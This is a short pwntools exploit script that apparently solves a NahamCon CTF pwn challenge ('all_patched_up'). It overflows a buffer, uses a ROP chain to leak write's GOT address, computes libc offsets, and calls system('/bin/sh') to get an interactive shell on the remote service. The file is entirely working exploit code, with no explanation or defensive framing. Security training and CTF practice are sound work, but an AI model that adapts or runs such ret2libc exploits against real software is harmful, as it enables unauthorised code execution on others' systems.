#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './all_patched_up'
elf = context.binary = ELF(exe, checksec=True)
rop = ROP(exe)
context.log_level = 'debug'
host = 'challenge.nahamcon.com'
port = 32244

def start(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
io = start()

# Got manually through cyclic gdb-pwndbg
offset = 520

# flattening  payload here
payload = flat({
    offset: [
        0x401251,           # pop rsi; pop r15; mov rdi, 1; ret; 
        elf.got['write'],   # rsi
        0,                  # r15
        elf.plt['write'],   # ret
        rop.ret.address,
        elf.sym['main']   
    ]
})

# sending payload
io.sendlineafter(b'>', payload)

gotwrite = unpack(io.recvuntil(b'\x00').strip().ljust(8, b'\x00')) 
libcbase = gotwrite - 0x10e060
binsh = libcbase + 0x1b45bd
system = libcbase + 0x52290

info('got write: %#x', gotwrite)
info('libcbase: %#x', libcbase)
info('binsh: %#x', binsh)
info('system: %#x', system)

payload = flat({
    offset: [
        libcbase + 0x23b6a, # pop rdi; ret
        binsh,
        rop.ret.address,
        system
    ]
})

io.sendlineafter(b'> ', payload)

io.interactive()